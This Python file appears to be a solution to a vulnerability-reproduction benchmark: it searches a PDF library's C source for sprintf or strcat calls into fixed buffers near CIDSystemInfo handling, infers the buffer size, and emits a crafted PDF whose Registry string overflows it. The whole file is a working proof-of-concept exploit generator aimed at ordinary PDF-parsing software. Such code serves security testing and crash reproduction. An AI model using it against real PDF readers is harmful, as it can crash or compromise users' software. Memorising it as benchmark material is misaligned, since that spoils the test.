import os
import re
import tarfile
from typing import Dict, Iterable, Iterator, List, Optional, Tuple


class Solution:
    def _iter_source_files(self, src_path: str) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    lfn = fn.lower()
                    if not lfn.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh")):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                        if st.st_size <= 0 or st.st_size > 8_000_000:
                            continue
                        with open(p, "rb") as f:
                            yield p, f.read()
                    except Exception:
                        continue
            return

        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf:
                    if not m.isreg():
                        continue
                    name = m.name
                    lname = name.lower()
                    if not lname.endswith((".c", ".h", ".cc", ".cpp", ".cxx", ".hpp", ".hh")):
                        continue
                    if m.size <= 0 or m.size > 8_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                        yield name, data
                    except Exception:
                        continue
        except Exception:
            return

    def _extract_defines(self, txt: str) -> Dict[str, int]:
        d: Dict[str, int] = {}
        for m in re.finditer(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+)\s*(?:$|/[*]|//)', txt, re.M):
            try:
                d[m.group(1)] = int(m.group(2))
            except Exception:
                pass
        for m in re.finditer(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(\d+)\s*$', txt, re.M):
            try:
                d[m.group(1)] = int(m.group(2))
            except Exception:
                pass
        return d

    def _infer_overflow_buffer_size(self, src_path: str) -> Tuple[Optional[int], str]:
        sprintf_re = re.compile(
            r'\b(?:sprint[fF]|sprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*"([^"\n]*%s[^"\n]*%s[^"\n]*)"\s*,',
            re.M,
        )
        strcat_hyphen_re = re.compile(r'\bstrcat\s*\(\s*([A-Za-z_]\w*)\s*,\s*"-"\s*\)\s*;', re.M)
        decl_re_tmpl = r'\b(?:char|unsigned\s+char|signed\s+char|byte|uint8_t|u?int8_t)\s+{var}\s*\[\s*([A-Za-z_]\w*|\d+)\s*\]'
        decl_re_cache: Dict[str, re.Pattern] = {}

        best_size: Optional[int] = None
        best_hint = ""

        for name, data in self._iter_source_files(src_path):
            if b"CIDSystemInfo" not in data and b"CIDFont" not in data and b"Registry" not in data and b"Ordering" not in data:
                continue

            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                continue

            if "CIDSystemInfo" not in txt and "CIDFont" not in txt and "Registry" not in txt and "Ordering" not in txt:
                continue

            defs = self._extract_defines(txt)

            candidates: List[Tuple[int, str]] = []

            for m in sprintf_re.finditer(txt):
                dest = m.group(1)
                fmt = m.group(2)
                if "-%s" not in fmt and ("%s-%s" not in fmt):
                    continue
                if fmt.count("%s") < 2:
                    continue

                if dest not in decl_re_cache:
                    decl_re_cache[dest] = re.compile(decl_re_tmpl.format(var=re.escape(dest)))
                dm = decl_re_cache[dest].search(txt)
                if not dm:
                    continue
                tok = dm.group(1)
                sz: Optional[int] = None
                if tok.isdigit():
                    try:
                        sz = int(tok)
                    except Exception:
                        sz = None
                else:
                    sz = defs.get(tok)
                if sz is None:
                    continue
                if 1 <= sz <= 2_000_000:
                    candidates.append((sz, f"{name}:sprintf:{dest}"))

            for m in strcat_hyphen_re.finditer(txt):
                dest = m.group(1)
                if "Registry" not in txt or "Ordering" not in txt:
                    continue
                if dest not in decl_re_cache:
                    decl_re_cache[dest] = re.compile(decl_re_tmpl.format(var=re.escape(dest)))
                dm = decl_re_cache[dest].search(txt)
                if not dm:
                    continue
                tok = dm.group(1)
                sz: Optional[int] = None
                if tok.isdigit():
                    try:
                        sz = int(tok)
                    except Exception:
                        sz = None
                else:
                    sz = defs.get(tok)
                if sz is None:
                    continue
                if 1 <= sz <= 2_000_000:
                    candidates.append((sz, f"{name}:strcat:{dest}"))

            if candidates:
                candidates.sort(key=lambda x: x[0])
                sz, hint = candidates[0]
                if best_size is None or sz < best_size:
                    best_size = sz
                    best_hint = hint
                if best_size is not None and best_size <= 256:
                    break

        return best_size, best_hint

    def _build_pdf_poc(self, reg_len: int, ord_len: int) -> bytes:
        registry = b"A" * max(1, reg_len)
        ordering = b"B" * max(1, ord_len)

        stream_data = b"BT\n/F1 12 Tf\n72 720 Td\n<0001> Tj\nET\n"
        stream_len = len(stream_data)

        objs: List[Tuple[int, bytes]] = []

        objs.append((1, b"<< /Type /Catalog /Pages 2 0 R >>"))
        objs.append((2, b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"))
        objs.append((
            3,
            b"<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 612 792] /Contents 5 0 R >>"
        ))
        objs.append((
            4,
            b"<< /Type /Font /Subtype /Type0 /BaseFont /Foo /DescendantFonts [6 0 R] /Encoding /Identity-H >>"
        ))

        cid_font = (
            b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Foo "
            b"/CIDSystemInfo << /Registry (" + registry + b") /Ordering (" + ordering + b") /Supplement 0 >> "
            b"/FontDescriptor 7 0 R /CIDToGIDMap /Identity /DW 1000 /W [1 [1000]] >>"
        )
        objs.append((6, cid_font))

        fd = (
            b"<< /Type /FontDescriptor /FontName /Foo /Flags 4 "
            b"/FontBBox [0 -200 1000 900] /ItalicAngle 0 /Ascent 800 /Descent -200 "
            b"/CapHeight 800 /StemV 80 >>"
        )
        objs.append((7, fd))

        stream_obj = b"<< /Length " + str(stream_len).encode("ascii") + b" >>\nstream\n" + stream_data + b"endstream"
        objs.append((5, stream_obj))

        objs.sort(key=lambda x: x[0])
        max_obj = max(n for n, _ in objs)

        out = bytearray()
        out += b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"

        offsets: Dict[int, int] = {0: 0}
        for n, body in objs:
            offsets[n] = len(out)
            out += str(n).encode("ascii") + b" 0 obj\n"
            out += body + b"\nendobj\n"

        xref_off = len(out)
        out += b"xref\n"
        out += b"0 " + str(max_obj + 1).encode("ascii") + b"\n"
        out += b"0000000000 65535 f \n"
        for i in range(1, max_obj + 1):
            off = offsets.get(i, 0)
            out += f"{off:010d} 00000 n \n".encode("ascii")

        out += b"trailer\n"
        out += b"<< /Size " + str(max_obj + 1).encode("ascii") + b" /Root 1 0 R >>\n"
        out += b"startxref\n"
        out += str(xref_off).encode("ascii") + b"\n"
        out += b"%%EOF\n"
        return bytes(out)

    def solve(self, src_path: str) -> bytes:
        bufsize, _hint = self._infer_overflow_buffer_size(src_path)

        if bufsize is None or bufsize <= 0:
            bufsize = 4096

        # Create <Registry>-<Ordering> longer than the inferred buffer.
        # Keep it relatively small to improve score and avoid excessive parser work.
        # Total written likely includes '-' and trailing NUL.
        ordering_len = 1
        registry_len = bufsize + 64

        # Guard against absurdly large inferred sizes (e.g., mis-detected macros).
        if registry_len > 200_000:
            registry_len = 200_000

        return self._build_pdf_poc(registry_len, ordering_len)